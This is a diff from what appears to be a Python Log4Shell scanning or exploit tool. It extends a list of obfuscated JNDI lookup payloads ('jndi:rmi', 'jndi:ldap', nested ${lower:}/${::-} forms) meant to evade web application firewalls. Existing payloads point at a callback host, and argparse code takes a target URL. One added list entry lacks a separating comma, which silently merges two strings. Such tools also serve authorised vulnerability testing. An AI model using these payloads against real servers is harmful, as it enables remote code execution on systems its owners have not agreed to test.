@@ -58,6 +58,22 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}"]
 
+protocols = [f'jndi:rmi',
+            f"jndi:dns:",
+            f'j${{k8s:k5:-ND}}i${{sd:k5:-:}}',
+            f'j${{mAin:\k5:-Nd}}i${{sPrIng:k5:-:}}',
+            f'j${{sYs:k5:-nD}}${{loWer:i${{weB:k5:-:}}}}',
+            f'j${{::-nD}}i${{::-:}}',
+            f'j${{EnV:K5:-nD}}i:ldap:',
+            f'j${{loWeR:Nd}}i${{uPpeR::}}'
+            f"${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-r}}${{::-m}}${{::-i}}:",
+            f"${{::-j}}ndi:rmi:",
+            f"${{lower:jndi}}:${{lower:rmi}}:",
+            f"${{lower:${{lower:jndi}}}}:${{lower:rmi}}:",
+            f"${{lower:j}}${{lower:n}}${{lower:d}}i:${{lower:rmi}}:",
+            f"${{lower:j}}${{upper:n}}${{lower:d}}${{upper:i}}:${{lower:r}}m${{lower:i}}:"
+            ]
+
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
                     dest="url",
